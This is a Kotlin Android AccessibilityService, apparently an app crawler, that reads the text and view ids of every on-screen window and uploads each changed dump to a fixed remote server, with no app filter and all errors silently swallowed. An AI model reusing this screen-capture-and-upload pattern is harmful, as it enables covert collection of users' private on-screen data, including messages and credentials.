package artista.labs.appcrawler

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.GsonBuilder
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit


class CrawlerService : AccessibilityService() {

    val TAG = "CrawlerService"
    private var lastEventTimeStamp: Long = 0
    private val DELAY = 100L
    val handler = Handler()
    val oldStringList = ArrayList<String>()
    val retrofit = getBasicRetrofitClient().create(ApiProvider::class.java)

    override fun onInterrupt() {

    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        readWindow(event)
        handler.removeCallbacksAndMessages(null)
        handler.postDelayed(object : Runnable {
            override fun run() {
                readWindow(event)
            }
        }, DELAY)
    }

    private fun traverseNode(node: AccessibilityNodeInfo?, stringList: ArrayList<String>) {
        try {
            if (node != null) {
                if (!node.text.isNullOrEmpty() || !node.viewIdResourceName.isNullOrEmpty()) {
                    val line = "${node.viewIdResourceName} --> ${node.text}"
                    Log.d(TAG, line)
                    stringList.add(line)
                }
                for (i in 0..node.childCount - 1)
                    traverseNode(node.getChild(i), stringList)
            }
        } catch (e: Exception) {

        }
    }

    private fun avoidSameEvent(event: AccessibilityEvent): Boolean {
        if (lastEventTimeStamp + DELAY > System.currentTimeMillis() && event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            //Log.d(TAG, "event from same node is ignored");
            return false
        }
        lastEventTimeStamp = System.currentTimeMillis()
        return true
    }

    private fun readWindow(event: AccessibilityEvent?) {
        try {
            if (event != null && avoidSameEvent(event)) {
                val stringList = ArrayList<String>()
                traverseNode(rootInActiveWindow, stringList)
                if (stringList.size > 0) sendDataToServer(stringList)
                handler.postDelayed(object : Runnable {
                    override fun run() {
                        readWindow(event)
                    }
                }, DELAY)
            }
        } catch (e: Exception) {
        }
    }

    private fun sendDataToServer(stringList: ArrayList<String>) {
        Log.d(TAG, getStringFromList(stringList))
        Log.e("Comparsion", matchesOldString(oldStringList, stringList).toString())
        try {
            if (!matchesOldString(oldStringList, stringList)) {
                Log.d("DumpOver", stringList[10])
                dumpData(getStringFromList(stringList))
                oldStringList.clear()
                oldStringList.addAll(stringList)
            }
        } catch (e: Exception) {

        }
    }

    private fun dumpData(data: String) {
        Log.d("CheckMaadi", data.substring(0, 20))
        try {
            val result = retrofit.dumpData(data)
            result.enqueue(object : Callback<String> {
                override fun onFailure(call: Call<String>, t: Throwable) {
                    Log.e("Error", t.message)
                }

                override fun onResponse(call: Call<String>, response: Response<String>) {
                    Log.d("Success", response.body().toString())
                }

            })
        } catch (e: Exception) {

        }
    }

    private fun getStringFromList(stringList: ArrayList<String>): String {
        var str = ""
        for (line in stringList)
            str = str + line + "\n"
        return str
    }

    private fun matchesOldString(oldStringList: ArrayList<String>, stringList: ArrayList<String>): Boolean {
        if (oldStringList.size == 0) return false
        if (oldStringList.size != stringList.size) return false
        for (i in 0..oldStringList.size - 1) {
            if (!oldStringList[i].equals(stringList[i])) return false
        }
        return true
    }

    fun getBasicRetrofitClient(): Retrofit {
        val logging = HttpLoggingInterceptor()
        logging.level = if (BuildConfig.DEBUG) HttpLoggingInterceptor.Level.BODY else HttpLoggingInterceptor.Level.NONE

        val okHttpClient = OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .writeTimeout(20, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .addInterceptor(logging)
            .build()

        val gson = GsonBuilder()
            .setLenient()
            .create()

        return Retrofit.Builder()
            .baseUrl("https://buyhatke.com/")
            .addConverterFactory(GsonConverterFactory.create(gson))
            .client(okHttpClient)
            .build()
    }
}
